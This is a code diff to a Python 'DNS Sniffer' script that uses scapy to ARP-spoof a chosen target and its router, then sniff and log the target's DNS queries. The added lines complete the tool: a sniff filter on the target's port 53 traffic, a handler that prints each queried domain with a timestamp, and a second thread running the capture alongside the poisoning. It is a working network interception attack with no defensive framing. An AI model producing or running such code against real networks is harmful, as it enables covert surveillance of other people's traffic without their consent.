@@ -1,6 +1,8 @@
 import argparse
 import threading
-from scapy.all import arp_mitm
+from colorama import Fore, Style
+from time import strftime, localtime, sleep
+from scapy.all import arp_mitm, sniff, DNS
 
 
 parser = argparse.ArgumentParser(description='DNS Sniffer')
@@ -22,16 +24,25 @@ class Device:
             try:
                 arp_mitm(self.routerip, self.targetip, iface=self.iface)
             except OSError:
-                print('IP seems down, retrying ...')
+                print('IP seems down, retrying...')
+                sleep(1)
                 continue
 
-
     def capture(self):
-        pass
+        sniff(iface=self.iface, prn=self.dns,
+              filter=f'src host {self.targetip} and udp port 53')
+
+    def dns(self, pkt):
+        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
+        time = strftime("%m%d%Y %H:%M:%S", localtime())
+        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
 
     def watch(self):
         t1 = threading.Thread(target=self.mitm, args=())
+        t2 = threading.Thread(target=self.capture, args=())
+
         t1.start()
+        t2.start()
 
 if __name__ == '__main__':
     device = Device(opts.routerip, opts.targetip, opts.iface)
